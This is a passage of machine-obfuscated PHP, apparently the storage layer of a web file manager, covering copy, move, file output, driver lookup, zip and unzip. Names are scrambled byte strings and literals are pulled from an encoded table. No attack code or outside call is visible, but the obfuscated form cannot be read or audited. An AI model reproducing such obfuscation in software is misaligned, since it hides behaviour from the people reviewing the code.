$Ù€›çÃ[$Û¸ğÕÃ‡[32]], $Ì×õ’ˆ™); if ($ß«äÆàˆ) { $²Ÿßİ™Ÿ = $ß«äÆàˆ->getPathOuter($²Ÿßİ™Ÿ); } return $²Ÿßİ™Ÿ; } private static function copyMove($ŠÓŠ¸ã, $»ÁŞ‹û», $÷î€™Û, $ìëòÁ, $¼‚“´‹Œ = false) { $åôûšü¼ =& $_SERVER[”ú…±Ú¥]; if (!$ŠÓŠ¸ã || $ŠÓŠ¸ã == $åôûšü¼[8] || !$»ÁŞ‹û») { return !1; } ignore_timeout(); $¹ªÓƒ˜³ = self::driverMake($ŠÓŠ¸ã); $ïò…’…… = self::driverMake($»ÁŞ‹û»); $Â÷ÍÌ¹ƒ = $ìëòÁ == $åôûšü¼[586]; $ºß¨²¸Ï = !1; if ($ïò…’……->pathParse[$åôûšü¼[1180]]) { $ºß¨²¸Ï = $ïò…’……; $»ÁŞ‹û» = $ïò…’……->pathParse[$åôûšü¼[1180]]; $ïò…’…… = self::driverMake($»ÁŞ‹û»); } if ($¹ªÓƒ˜³->pathParse[$åôûšü¼[1180]]) { $ŠÓŠ¸ã = $¹ªÓƒ˜³->pathParse[$åôûšü¼[1180]]; $¹ªÓƒ˜³ = self::driverMake($ŠÓŠ¸ã); } self::check($¹ªÓƒ˜³, $ŠÓŠ¸ã, $ïò…’……, $»ÁŞ‹û»); Hook::trigger($åôûšü¼[1181], $¹ªÓƒ˜³, $ŠÓŠ¸ã, $ïò…’……, $»ÁŞ‹û»); $÷Ş„ÀĞ = self::driverIsSame($¹ªÓƒ˜³, $ïò…’……); if ($÷Ş„ÀĞ) { if ($ìëòÁ == $åôûšü¼[586] && !method_exists($ïò…’……, $åôûšü¼[1182]) && trim($»ÁŞ‹û», $åôûšü¼[8]) == trim($ïò…’……->pathFather($ŠÓŠ¸ã), $åôûšü¼[8])) { if ($¹ªÓƒ˜³->pathThis($ŠÓŠ¸ã) != $¼‚“´‹Œ && !$¹ªÓƒ˜³->isTypeObject()) { return $¹ªÓƒ˜³->rename($ŠÓŠ¸ã, $¼‚“´‹Œ); } return $ïò…’……->getPathOuter($ŠÓŠ¸ã); } if (method_exists($ïò…’……, $ìëòÁ)) { return $ïò…’……->{$ìëòÁ}($ŠÓŠ¸ã, $»ÁŞ‹û», $÷î€™Û, $¼‚“´‹Œ); } } if ($÷Ş„ÀĞ && $ìëòÁ == $åôûšü¼[586] && $ïò…’……->getType() == $åôûšü¼[106]) { $¢ı‡·óØ = $ïò…’……->movePath($ŠÓŠ¸ã, $»ÁŞ‹û», $¼‚“´‹Œ); if ($¢ı‡·óØ) { return $¢ı‡·óØ; } } $á‘š´¨ë = $¹ªÓƒ˜³->isFile($ŠÓŠ¸ã); if (!$á‘š´¨ë && $ïò…’……->getType() == $åôûšü¼[789] && $¹ªÓƒ˜³->getType() == $åôûšü¼[106]) { $¢ı‡·óØ = $ïò…’……->copyFolderFromIO($¹ªÓƒ˜³, $ŠÓŠ¸ã, $»ÁŞ‹û», $÷î€™Û, $Â÷ÍÌ¹ƒ, $¼‚“´‹Œ); } else { $¢ı‡·óØ = self::copyPath($¹ªÓƒ˜³, $ŠÓŠ¸ã, $ïò…’……, $»ÁŞ‹û», $÷î€™Û, $Â÷ÍÌ¹ƒ, $á‘š´¨ë, $¼‚“´‹Œ); } if ($¢ı‡·óØ && $Â÷ÍÌ¹ƒ) { $¹ªÓƒ˜³->remove($ŠÓŠ¸ã); } if ($ºß¨²¸Ï) { $¢ı‡·óØ = $ºß¨²¸Ï->getPathOuter($¢ı‡·óØ); } return $¢ı‡·óØ; } private static function check($Äª§Õğ, $ê–ó†Îş, $²ä©‡ Ö, &$úÂµ¥¦è) { $èªŠ =& $_SERVER[”ú…±Ú¥]; if (self::driverIsSame($Äª§Õğ, $²ä©‡ Ö) && $Äª§Õğ->isFolder($ê–ó†Îş) && $Äª§Õğ->isParentOf($ê–ó†Îş, $úÂµ¥¦è)) { show_json(LNG($èªŠ[1183]), !1); } if (!$Äª§Õğ->exist($ê–ó†Îş)) { show_json(LNG($èªŠ[105]), !1); } } private static function copyPath($š’ßãû, $ÎöñĞˆ¬, $äéüëÄª, $Úúø«“, $·è¢àÊú, $€äß¹†, $ñ¦›ûÒ, $ğÓ¬şá¥ = false, $Š²³í¹ = true) { $¶›òÙ¡ =& $_SERVER[”ú…±Ú¥]; $×Š¥‡îå = empty($ğÓ¬şá¥) && $ğÓ¬şá¥ !== $¶›òÙ¡[208] ? $š’ßãû->pathThis($ÎöñĞˆ¬) : $ğÓ¬şá¥; if ($·è¢àÊú) { $óüĞ³˜© = $äéüëÄª->fileNameExist($Úúø«“, $×Š¥‡îå); $µ”Ù—¬Ş = $×Š¥‡îå; $×Š¥‡îå = $äéüëÄª->fileNameAuto($Úúø«“, $×Š¥‡îå, $·è¢àÊú, !$ñ¦›ûÒ); if (!$óüĞ³˜© || $µ”Ù—¬Ş != $×Š¥‡îå) { $·è¢àÊú = !1; } if ($Š²³í¹ && !$·è¢àÊú) { $äéüëÄª->_data[$¶›òÙ¡[1184]] = !0; } } if ($ñ¦›ûÒ) { return self::copyFile($š’ßãû, $ÎöñĞˆ¬, $äéüëÄª, $Úúø«“, $×Š¥‡îå, $€äß¹†); } if ($·è¢àÊú == REPEAT_RENAME_FOLDER) { $·è¢àÊú = !1; } $Œ‘ñòã = rtrim($Úúø«“, $¶›òÙ¡[8]) . $¶›òÙ¡[8] . $×Š¥‡îå; $×ßÒ®€« = $äéüëÄª->mkdir($äéüëÄª->getPath($Œ‘ñòã), $·è¢àÊú); $Úúø«“ = $äéüëÄª->getPathInner($×ßÒ®€«); $Å¤¾Æı© = $š’ßãû->listPath($ÎöñĞˆ¬, !0); $Å¤¾Æı© = is_array($Å¤¾Æı©) ? $Å¤¾Æı© : array($¶›òÙ¡[83] => array(), $¶›òÙ¡[82] => array()); $Âêª´‘ş = array_merge($Å¤¾Æı©[$¶›òÙ¡[83]], $Å¤¾Æı©[$¶›òÙ¡[82]]); foreach ($Âêª´‘ş as $üş£»ñ•) { $ÅÒ™€Ú® = $üş£»ñ•[$¶›òÙ¡[33]] == $¶›òÙ¡[210]; $ÎöñĞˆ¬ = $š’ßãû->getPathInner($üş£»ñ•[$¶›òÙ¡[84]]); $£€Ùß¨§ = self::copyPath($š’ßãû, $ÎöñĞˆ¬, $äéüëÄª, $Úúø«“, $·è¢àÊú, $€äß¹†, $ÅÒ™€Ú®, !1, !1); if (!$£€Ùß¨§) { IO::errorTips($¶›òÙ¡[1185] . $ÎöñĞˆ¬ . $¶›òÙ¡[70] . $Úúø«“); } } self::copyMoveKeepInfo($š’ßãû, $ÎöñĞˆ¬, $×ßÒ®€«); return $×ßÒ®€«; } private static function copyFile($ÒóÔ³óØ, $ê¿”Ó®Ï, $ÕÌßÂà, $ğôæª’Ë, $ùÄ×ÍÊ, $ÛŒÀ³ìù) { $âù½¯™Ú =& $_SERVER[”ú…±Ú¥]; $ğôæª’Ë = $ÕÌßÂà->getPath(rtrim($ğôæª’Ë, $âù½¯™Ú[8]) . $âù½¯™Ú[8] . $ùÄ×ÍÊ); $ÀğÃ¡Ø = $âù½¯™Ú[1186] . time() . rand_string(5); Hook::trigger($âù½¯™Ú[1187], $ÒóÔ³óØ, $ê¿”Ó®Ï, $ÕÌßÂà, $ğôæª’Ë, $ùÄ×ÍÊ, $ÀğÃ¡Ø); if (self::driverIsSame($ÒóÔ³óØ, $ÕÌßÂà)) { if ($ÛŒÀ³ìù) { $˜ş”ø›ó = $ÕÌßÂà->moveFile($ê¿”Ó®Ï, $ğôæª’Ë); } else { $˜ş”ø›ó = $ÕÌßÂà->copyFile($ê¿”Ó®Ï, $ğôæª’Ë); } Hook::trigger($âù½¯™Ú[1188], $ÒóÔ³óØ, $ê¿”Ó®Ï, $ÕÌßÂà, $ğôæª’Ë, $ùÄ×ÍÊ, $˜ş”ø›ó); self::copyMoveKeepInfo($ÒóÔ³óØ, $ê¿”Ó®Ï, $˜ş”ø›ó); return $˜ş”ø›ó; } $“«Šğâı = TEMP_FILES; if ($GLOBALS[$âù½¯™Ú[6]][$âù½¯™Ú[89]][$âù½¯™Ú[828]]) { $“«Šğâı = $GLOBALS[$âù½¯™Ú[6]][$âù½¯™Ú[89]][$âù½¯™Ú[828]]; } $ƒíÚäœÒ = $“«Šğâı; mk_dir($ƒíÚäœÒ); $”² Óş = $ƒíÚäœÒ . $ÀğÃ¡Ø; $õ„•®ùœ = $”² Óş; $”² Óş = $ÒóÔ³óØ->download($ê¿”Ó®Ï, $”² Óş); $”² Óş = $ÒóÔ³óØ->iconvApp($”² Óş); if (substr($”² Óş, strlen($“«Šğâı)) == $“«Šğâı) { $ÛŒÀ³ìù = !0; } $˜ş”ø›ó = $ÕÌßÂà->upload($ğôæª’Ë, $”² Óş, $ÛŒÀ³ìù); self::remove($õ„•®ùœ); Hook::trigger($âù½¯™Ú[1188], $ÒóÔ³óØ, $ê¿”Ó®Ï, $ÕÌßÂà, $ğôæª’Ë, $ùÄ×ÍÊ, $˜ş”ø›ó); self::copyMoveKeepInfo($ÒóÔ³óØ, $ê¿”Ó®Ï, $˜ş”ø›ó); return $˜ş”ø›ó; } private static function copyMoveKeepInfo($ä€·²š÷, $ò¯î¿‹ç, $äÇªêğ™) { if (!$äÇªêğ™) { return; } $µ³İ¸ê½ = $ä€·²š÷->info($ò¯î¿‹ç); if (!is_array($µ³İ¸ê½)) { return; } IO::setModifyTime($äÇªêğ™, $µ³İ¸ê½[$_SERVER[”ú…±Ú¥][85]]); } public static function pathFather($‚·¹½²) { $¶«÷æ­“ = IO::init($‚·¹½²); $Æ„Ü¼µŸ = $¶«÷æ­“->pathFather($¶«÷æ­“->path); return $¶«÷æ­“->getPathOuter($Æ„Ü¼µŸ); } public static function fileOut($­¼¡¾Õ, $úĞ°¯äí = false, $²Üà¤óÛ = false, $œ–×¬» = '') { $Ë˜¨Â‘¨ = self::driverMake($­¼¡¾Õ); if ($Ë˜¨Â‘¨->isFileOutServer()) { return $Ë˜¨Â‘¨->fileOutServer($­¼¡¾Õ, $úĞ°¯äí, $²Üà¤óÛ, $œ–×¬»); } return $Ë˜¨Â‘¨->fileOut($­¼¡¾Õ, $úĞ°¯äí, $²Üà¤óÛ, $œ–×¬»); } public static function fileOutImage($À‚ã«¸, $Ë‘“°¶¡ = 250) { $‡ÛÍ€¨õ = array(250, 600, 1200, 2000, 3000, 5000); for ($ğ‚´í±Ó = 0; $ğ‚´í±Ó < count($‡ÛÍ€¨õ); $ğ‚´í±Ó++) { if ($ğ‚´í±Ó == 0 && $Ë‘“°¶¡ <= $‡ÛÍ€¨õ[$ğ‚´í±Ó]) { $Ë‘“°¶¡ = $‡ÛÍ€¨õ[$ğ‚´í±Ó]; break; } else { if ($Ë‘“°¶¡ > $‡ÛÍ€¨õ[$ğ‚´í±Ó - 1] && $Ë‘“°¶¡ <= $‡ÛÍ€¨õ[$ğ‚´í±Ó]) { $Ë‘“°¶¡ = $‡ÛÍ€¨õ[$ğ‚´í±Ó]; break; } else { if ($ğ‚´í±Ó == count($‡ÛÍ€¨õ) - 1 && $Ë‘“°¶¡ > $‡ÛÍ€¨õ[$ğ‚´í±Ó]) { $Ë‘“°¶¡ = $‡ÛÍ€¨õ[$ğ‚´í±Ó]; break; } } } } $Ü©’Ô´ı = self::driverMake($À‚ã«¸); if ($Ü©’Ô´ı->isFileOutServer()) { return $Ü©’Ô´ı->fileOutImageServer($À‚ã«¸, $Ë‘“°¶¡); } return $Ü©’Ô´ı->fileOutImage($À‚ã«¸, $Ë‘“°¶¡); } private static function driverIsSame($æ¸ú¼îá, $ëÖÏÁÛ) { $íş¼ü»Ş =& $_SERVER[”ú…±Ú¥]; $î€Õ´¬ = $æ¸ú¼îá->getType(); $Àë§à = $ëÖÏÁÛ->getType(); if ($î€Õ´¬ != $Àë§à) { return !1; } if ($î€Õ´¬ == $íş¼ü»Ş[789]) { return !0; } if ($î€Õ´¬ == $íş¼ü»Ş[106]) { return !0; } if ($æ¸ú¼îá->pathDriver == $ëÖÏÁÛ->pathDriver) { return !0; } return !1; } public static function copyUpdate($µşÛËØÌ, $ÄÛÑ€¡ª) { $üóÖ»èş =& $_SERVER[”ú…±Ú¥]; if (!IO::exist($µşÛËØÌ)) { return !1; } if (!IO::exist($ÄÛÑ€¡ª)) { IO::mkdir($ÄÛÑ€¡ª); } $±‹™ ğ = array_to_keyvalue(self::listAllSimple($µşÛËØÌ), $üóÖ»èş[84]); $éú¢¶ = array_to_keyvalue(self::listAllSimple($ÄÛÑ€¡ª), $üóÖ»èş[84]); $˜¼›´Äá = array(); $ãÃîÕŒ = array(); foreach ($±‹™ ğ as $ñ¹‡Ìûˆ => $—¿Óæ…Æ) { if (isset($éú¢¶[$ñ¹‡Ìûˆ])) { if ($—¿Óæ…Æ[$üóÖ»èş[75]] == 1) { continue; } if ($éú¢¶[$ñ¹‡Ìûˆ][$üóÖ»èş[76]] == $—¿Óæ…Æ[$üóÖ»èş[76]]) { continue; } } if ($—¿Óæ…Æ[$üóÖ»èş[75]] == 1) { $ãÃîÕŒ[] = $ÄÛÑ€¡ª . $üóÖ»èş[8] . trim($ñ¹‡Ìûˆ, $üóÖ»èş[8]); continue; } $­îÚ§üç = strstr(trim($ñ¹‡Ìûˆ, $üóÖ»èş[8]), $üóÖ»èş[8]) ? get_path_father($ñ¹‡Ìûˆ) : $üóÖ»èş[12]; $˜¼›´Äá[] = array($üóÖ»èş[1189] => $—¿Óæ…Æ[$üóÖ»èş[86]], $üóÖ»èş[1190] => rtrim($ÄÛÑ€¡ª, $üóÖ»èş[8]) . $üóÖ»èş[8] . $­îÚ§üç, $üóÖ»èş[1191] => $—¿Óæ…Æ); } $­Ï«³¢† = array($üóÖ»èş[210] => $˜¼›´Äá, $üóÖ»èş[75] => $ãÃîÕŒ); Hook::trigger($üóÖ»èş[1192], $µşÛËØÌ, $ÄÛÑ€¡ª, $­Ï«³¢†); foreach ($ãÃîÕŒ as $—¿Óæ…Æ) { IO::mkdir($—¿Óæ…Æ); } foreach ($˜¼›´Äá as $—¿Óæ…Æ) { IO::copy($—¿Óæ…Æ[$üóÖ»èş[1189]], $—¿Óæ…Æ[$üóÖ»èş[1190]], REPEAT_REPLACE); } } public static function fileSubstr($„ºêÒï, $Ÿ•ïûœ, $¾§ÒğµÖ = false) { $ë•Ìæ =& $_SERVER[”ú…±Ú¥]; $©ú´Àíš = self::driverMake($„ºêÒï); $ããÜåí‚ = $©ú´Àíš->size($„ºêÒï); $²ú½ÕÇ× = $Ÿ•ïûœ; $ğ¾¶§‚ = $¾§ÒğµÖ; if ($Ÿ•ïûœ < 0) { $Ÿ•ïûœ = $ããÜåí‚ + $Ÿ•ïûœ; } if ($¾§ÒğµÖ === !1) { $¾§ÒğµÖ = $ããÜåí‚ - $Ÿ•ïûœ; } if ($Ÿ•ïûœ + $¾§ÒğµÖ > $ããÜåí‚) { $¾§ÒğµÖ = $ããÜåí‚ - $Ÿ•ïûœ; } if (!$ããÜåí‚ && $©ú´Àíš->getType() == $ë•Ìæ[106] && !$©ú´Àíš->exist($„ºêÒï)) { $Ûì¬‚„  = get_path_this($„ºêÒï); $Èé¸Í°Ê = parse_url_query($Ûì¬‚„ ); if (is_array($Èé¸Í°Ê) && isset($Èé¸Í°Ê[$ë•Ìæ[32]])) { $Ûì¬‚„  = urldecode($Èé¸Í°Ê[$ë•Ìæ[32]]); } throw new Exception($ë•Ìæ[1193] . LNG($ë•Ìæ[1194]) . $ë•Ìæ[995] . clear_html($Ûì¬‚„ ) . $ë•Ìæ[12]); } if ($¾§ÒğµÖ <= 0) { return $ë•Ìæ[12]; } if ($Ÿ•ïûœ < 0 || $Ÿ•ïûœ >= $ããÜåí‚ || $¾§ÒğµÖ > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\145\x52\x65\x61\x64\x20\x65\162\x72\x6f\162\x21\x20\163\164\x61\162\164\75{$Ÿ•ïûœ}\73\x6c\x65\x6e\x67\164\x68\75{$¾§ÒğµÖ}\73\40\x73\151\172\x65\x3d{$ããÜåí‚}\x3b"); } $­Úü¡ŞÑ = $©ú´Àíš->fileSubstr($„ºêÒï, $Ÿ•ïûœ, $¾§ÒğµÖ); if (!$­Úü¡ŞÑ && $¾§ÒğµÖ && isset($GLOBALS[$ë•Ìæ[1195]])) { throw new Exception($GLOBALS[$ë•Ìæ[1195]][$ë•Ìæ[1196]]); } return $­Úü¡ŞÑ; } private static function driverMake(&$´êá•‚Ä) { $÷œ ´° =& $_SERVER[”ú…±Ú¥]; $Œƒ„Ã—› = KodIO::parse($´êá•‚Ä); if (!self::$driverListSystem) { $ˆÕÒá¼Ç = Model($÷œ ´°[799])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ˆÕÒá¼Ç, $÷œ ´°[437]); } if ($Œƒ„Ã—›[$÷œ ´°[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Œƒ„Ã—›[$÷œ ´°[437]]]) { return !1; } $´êá•‚Ä = $Œƒ„Ã—›[$÷œ ´°[1197]]; $ƒçÀÂµ” = self::driverGet($Œƒ„Ã—›, $´êá•‚Ä); return $ƒçÀÂµ”; } private static function driverGet($¾­–Õçí, &$ÖìÁ’†é) { $‡†ºÙÁš =& $_SERVER[”ú…±Ú¥]; $Ê…‡Úäì = $¾­–Õçí[$‡†ºÙÁš[1198]]; $ªåşº€Æ = $¾­–Õçí[$‡†ºÙÁš[437]]; switch ($¾­–Õçí[$‡†ºÙÁš[33]]) { case KodIO::KOD_IO: $¯÷ ‰°Í = self::$driverListSystem[$ªåşº€Æ]; break; case KodIO::KOD_SOURCE: $ÖìÁ’†é = $ªåşº€Æ . $ÖìÁ’†é; $¯÷ ‰°Í = array($‡†ºÙÁš[1199] => $‡†ºÙÁš[1200], $‡†ºÙÁš[6] => $¾­–Õçí); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ÕÈõ±Á‚ = $GLOBALS[$‡†ºÙÁš[1201]]; self::$driverListUser = array_to_keyvalue($ÕÈõ±Á‚, $‡†ºÙÁš[437]); } $¯÷ ‰°Í = self::$driverListUser[$ªåşº€Æ]; break; case KodIO::KOD_SHARE_LINK: $¯÷ ‰°Í = array($‡†ºÙÁš[1199] => $‡†ºÙÁš[1202], $‡†ºÙÁš[6] => $¾­–Õçí); $«©§«¼‡ = Action($‡†ºÙÁš[1203])->sharePathInfo($¾­–Õçí[$‡†ºÙÁš[84]]); $ÖìÁ’†é = $«©§«¼‡[$‡†ºÙÁš[440]]; if (!$«©§«¼‡[$‡†ºÙÁš[440]]) { $òë“Ùùù = Model($‡†ºÙÁš[630])->getInfo($«©§«¼‡[$‡†ºÙÁš[631]]); $ÖìÁ’†é = KodIO::clear($òë“Ùùù[$‡†ºÙÁš[1204]] . $¾­–Õçí[$‡†ºÙÁš[1197]]); $¾­–Õçí[$‡†ºÙÁš[524]] = $òë“Ùùù; $¾­–Õçí[$‡†ºÙÁš[1180]] = $ÖìÁ’†é; $¯÷ ‰°Í = array($‡†ºÙÁš[1199] => $‡†ºÙÁš[1205], $‡†ºÙÁš[6] => $¾­–Õçí); } break; case KodIO::KOD_SHARE_ITEM: $¯÷ ‰°Í = array($‡†ºÙÁš[1199] => $‡†ºÙÁš[1206], $‡†ºÙÁš[6] => $¾­–Õçí); $òë“Ùùù = Model($‡†ºÙÁš[630])->getInfo($¾­–Õçí[$‡†ºÙÁš[437]]); if ($òë“Ùùù[$‡†ºÙÁš[440]] == $‡†ºÙÁš[208]) { $ÖìÁ’†é = KodIO::clear($òë“Ùùù[$‡†ºÙÁš[1204]] . $¾­–Õçí[$‡†ºÙÁš[1197]]); $¾­–Õçí[$‡†ºÙÁš[524]] = $òë“Ùùù; $¾­–Õçí[$‡†ºÙÁš[1180]] = $ÖìÁ’†é; $¯÷ ‰°Í = array($‡†ºÙÁš[1199] => $‡†ºÙÁš[1207], $‡†ºÙÁš[6] => $¾­–Õçí); } else { if (!$ÖìÁ’†é) { $ÖìÁ’†é = $òë“Ùùù[$‡†ºÙÁš[440]]; } } break; default: $ÖìÁ’†é = $¾­–Õçí[$‡†ºÙÁš[84]]; $¯÷ ‰°Í = array($‡†ºÙÁš[1199] => $‡†ºÙÁš[1208]); break; } $îòÈš— = $¾­–Õçí[$‡†ºÙÁš[84]]; if (!isset(self::$driverCache[$îòÈš—])) { $ªå¨‡®é = strtolower($¯÷ ‰°Í[$‡†ºÙÁš[95]]); $ßæÙ©€© = $GLOBALS[$‡†ºÙÁš[6]][$‡†ºÙÁš[89]][$‡†ºÙÁš[858]]; $ê…ËÜ¬‰ = $‡†ºÙÁš[74] . (isset($ßæÙ©€©[$ªå¨‡®é]) ? $ßæÙ©€©[$ªå¨‡®é] : ucfirst($ªå¨‡®é)); if (!class_exists($ê…ËÜ¬‰)) { show_json("{$ê…ËÜ¬‰}\40\x6e\x6f\x74\x20\145\170\x69\163\x74\x73\x21", !1); } $şÆæíè¸ = isset($¯÷ ‰°Í[$‡†ºÙÁš[6]]) ? $¯÷ ‰°Í[$‡†ºÙÁš[6]] : !1; self::$driverCache[$îòÈš—] = new $ê…ËÜ¬‰($şÆæíè¸); } $Ÿ¾åµßû = self::$driverCache[$îòÈš—]; $Ÿ¾åµßû->pathDriver = $Ê…‡Úäì; $Ÿ¾åµßû->pathBase = $‡†ºÙÁš[12]; if (isset($¯÷ ‰°Í[$‡†ºÙÁš[6]][$‡†ºÙÁš[1209]])) { $Ÿ¾åµßû->pathBase = rtrim($¯÷ ‰°Í[$‡†ºÙÁš[6]][$‡†ºÙÁš[1209]], $‡†ºÙÁš[8]) . $‡†ºÙÁš[8]; $ÖìÁ’†é = $Ÿ¾åµßû->pathBase . ltrim($ÖìÁ’†é, $‡†ºÙÁš[8]); } $ÖìÁ’†é = $Ÿ¾åµßû->getPath($ÖìÁ’†é); if (isset($¾­–Õçí[$‡†ºÙÁš[1180]])) { $ÖìÁ’†é = $¾­–Õçí[$‡†ºÙÁš[1180]]; } $Ÿ¾åµßû->path = $ÖìÁ’†é; return $Ÿ¾åµßû; } public static function errorTips($Ó¥ùßß = false) { $†ëñº”± =& $_SERVER[”ú…±Ú¥]; static $æË„Èæº = array(); $ø‹ãè–« = 1000; if ($Ó¥ùßß === -1) { return $æË„Èæº ? $æË„Èæº[count($æË„Èæº) - 1] : $†ëñº”±[12]; } if ($Ó¥ùßß === !1) { return implode($†ëñº”±[191], $æË„Èæº); } if (count($æË„Èæº) >= $ø‹ãè–«) { $æË„Èæº = array_slice($æË„Èæº, $ø‹ãè–« * 0.5, $ø‹ãè–«); } $æË„Èæº[] = $Ó¥ùßß; write_log($†ëñº”±[162] . ACTION . $†ëñº”±[1210] . $Ó¥ùßß, $†ëñº”±[1211]); } public static function getLastError($ÚÉ’¨› = '') { $ÈÅŒ™§¬ = self::errorTips(-1); return $ÈÅŒ™§¬ ? $ÈÅŒ™§¬ : $ÚÉ’¨›; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ªè´«ë; if ($ªè´«ë) { return $ªè´«ë; } $”’ÈµüÁ = IO::init($_SERVER[”ú…±Ú¥][8]); return $”’ÈµüÁ; } private static function iconvSystem($ä€Û½·¥) { return self::local()->iconvSystem($ä€Û½·¥); } private static function iconvApp($äøÄåøœ) { return self::local()->iconvApp($äøÄåøœ); } public static function zipFolder($µ¤¸¾–¢, $µ·¡±¦á = "\172\151\x70", $ìõÊ“¸Æ = '', $­Èõ¨Õ = REPEAT_RENAME) { $Åòøºıİ =& $_SERVER[”ú…±Ú¥]; $¢ş‡ô¿ = IO::listPath($µ¤¸¾–¢); if (!$¢ş‡ô¿) { return !1; } $¢ş‡ô¿ = array_merge($¢ş‡ô¿[$Åòøºıİ[82]], $¢ş‡ô¿[$Åòøºıİ[83]]); return self::zip($¢ş‡ô¿, $µ·¡±¦á, $ìõÊ“¸Æ, $­Èõ¨Õ); } public static function zip($òÊ¹–Ôõ, $§²§¢ğ‚ = "\172\151\x70", $Î‰ÇüÒ = '', $øè”—§ı = REPEAT_RENAME) { $˜ôééÈ =& $_SERVER[”ú…±Ú¥]; if (is_string($òÊ¹–Ôõ) && $òÊ¹–Ôõ) { $òÊ¹–Ôõ = array(array($˜ôééÈ[84] => $òÊ¹–Ôõ)); } $£á“œ˜› = self::init($òÊ¹–Ôõ[0][$˜ôééÈ[84]]); $•¾½­›ù = self::info($òÊ¹–Ôõ[0][$˜ôééÈ[84]]); $˜ÙÀßÍ´ = $˜ôééÈ[12]; $“ã‹ìÓ = $˜ôééÈ[12]; $Ñ„°§«¢ = $˜ôééÈ[12]; if ($Î‰ÇüÒ && substr($Î‰ÇüÒ, -1, 1) != $˜ôééÈ[8]) { $“ã‹ìÓ = get_path_father($Î‰ÇüÒ); $Ñ„°§«¢ = get_path_this($Î‰ÇüÒ); } else { $“ã‹ìÓ = self::pathFather($•¾½­›ù[$˜ôééÈ[84]]); $Ñ„°§«¢ = $•¾½­›ù[$˜ôééÈ[32]] . $˜ôééÈ[10] . $§²§¢ğ‚; if (count($òÊ¹–Ôõ) > 1) { $õ¹ìË»× = IO::info($“ã‹ìÓ); $Ñ„°§«¢ = $õ¹ìË»×[$˜ôééÈ[32]] . $˜ôééÈ[10] . $§²§¢ğ‚; } if ($Î‰ÇüÒ) { $“ã‹ìÓ = $Î‰ÇüÒ; } } if ($£á“œ˜›->getType() == $˜ôééÈ[106]) { $ĞØ‚å­… = self::init($“ã‹ìÓ); $í­ŠºÂ³ = $ĞØ‚å­…->getType() == $˜ôééÈ[106] ? $“ã‹ìÓ : get_path_father($£á“œ˜›->path); $í­ŠºÂ³ = rtrim($í­ŠºÂ³, $˜ôééÈ[8]) . $˜ôééÈ[8]; mk_dir($í­ŠºÂ³); } else { $˜ÙÀßÍ´ = TEMP_FILES . $˜ôééÈ[1212] . time() . rand_string(8) . $˜ôééÈ[8]; mk_dir($˜ÙÀßÍ´); file_put_contents($˜ÙÀßÍ´ . $˜ôééÈ[1213], $˜ôééÈ[12]); $í­ŠºÂ³ = $˜ÙÀßÍ´; } $¿†ÙÓ£š = IO::info($í­ŠºÂ³); if (!$¿†ÙÓ£š || !$¿†ÙÓ£š[$˜ôééÈ[213]]) { show_json(LNG($˜ôééÈ[1214]), !1); } $È•¶›ÜÊ = self::zipFileList($òÊ¹–Ôõ, $˜ÙÀßÍ´); foreach ($È•¶›ÜÊ as $·êØóõÙ => $Ì¾€¬·¿) { $È•¶›ÜÊ[$·êØóõÙ] = self::iconvSystem($Ì¾€¬·¿); } $¦€éëÑö = get_filename_auto($í­ŠºÂ³ . $Ñ„°§«¢, $˜ôééÈ[12], $øè”—§ı); KodArchive::create(self::iconvSystem($¦€éëÑö), $È•¶›ÜÊ); if (!IO::exist($¦€éëÑö)) { if ($˜ÙÀßÍ´) { del_dir($˜ÙÀßÍ´); } show_json(LNG($˜ôééÈ[1215]), !1); } if (!$˜ÙÀßÍ´) { return $¦€éëÑö; } $Óş¢íÎ· = self::move($¦€éëÑö, $“ã‹ìÓ, $øè”—§ı); if ($˜ÙÀßÍ´) { del_dir($˜ÙÀßÍ´); } if (!$¦€éëÑö) { show_json(LNG($˜ôééÈ[1215]), !1); } return $Óş¢íÎ·; } public static function unzip($¤”¹ĞıÜ, $Ò—¬Ï°ñ, $×¯”Åáğ = "\55\61", $Úí¦™‘„ = "\x72\145\x70\x6c\141\143\145") { $¼ï††ÄÏ =& $_SERVER[”ú…±Ú¥]; $ˆçÁŒ˜ = parent::info($¤”¹ĞıÜ); if (!$ˆçÁŒ˜) { show_json(LNG($¼ï††ÄÏ[1216]), !1); } $Ç·‡âÇ = IO::infoFull($Ò—¬Ï°ñ); if (!$Ç·‡âÇ) { $Ò—¬Ï°ñ = IO::mkdir($Ò—¬Ï°ñ); } if (isset($Ç·‡âÇ[$¼ï††ÄÏ[440]]) && trim($Ç·‡âÇ[$¼ï††ÄÏ[84]], $¼ï††ÄÏ[8]) != trim($Ò—¬Ï°ñ, $¼ï††ÄÏ[8])) { $íòÊšß© = KodIO::make($Ç·‡âÇ[$¼ï††ÄÏ[470]]); $Åœ¡¼‘‡ = IO::fileNameAuto($íòÊšß©, $Ç·‡âÇ[$¼ï††ÄÏ[32]], REPEAT_RENAME_FOLDER, !0); $Ò—¬Ï°ñ = IO::mkdir($íòÊšß© . $Åœ¡¼‘‡); } $×¯”Åáğ = $×¯”Åáğ && $×¯”Åáğ != $¼ï††ÄÏ[1217] ? @json_decode($×¯”Åáğ, !0) : -1; $­úÇƒÚ´ = self::unzipPart($¤”¹ĞıÜ, $×¯”Åáğ); if (!$­úÇƒÚ´ || !IO::exist($­úÇƒÚ´[$¼ï††ÄÏ[210]])) { show_json(LNG($¼ï††ÄÏ[105]), !1); } $º½‡Å‡€ = $­úÇƒÚ´[$¼ï††ÄÏ[1218]][count($­úÇƒÚ´[$¼ï††ÄÏ[1218]]) - 1]; if ($º½‡Å‡€[$¼ï††ÄÏ[1219]] == -1 || substr($º½‡Å‡€[$¼ï††ÄÏ[32]], -1, 1) == $¼ï††ÄÏ[8]) { $±ºØìİ¤ = $­úÇƒÚ´[$¼ï††ÄÏ[1220]] . rand_string(10) . $¼ï††ÄÏ[8]; mk_dir($±ºØìİ¤); $ÍÕŠ’Ş‹ = count($­úÇƒÚ´[$¼ï††ÄÏ[1218]]) == 1 ? IO::ext($¤”¹ĞıÜ) : get_path_ext($­úÇƒÚ´[$¼ï††ÄÏ[210]]); $Îú¢¤îÓ = KodArchive::extract(self::iconvSystem($­úÇƒÚ´[$¼ï††ÄÏ[210]]), $±ºØìİ¤, $º½‡Å‡€[$¼ï††ÄÏ[1219]], $Åœ¡¼‘‡, $ÍÕŠ’Ş‹); 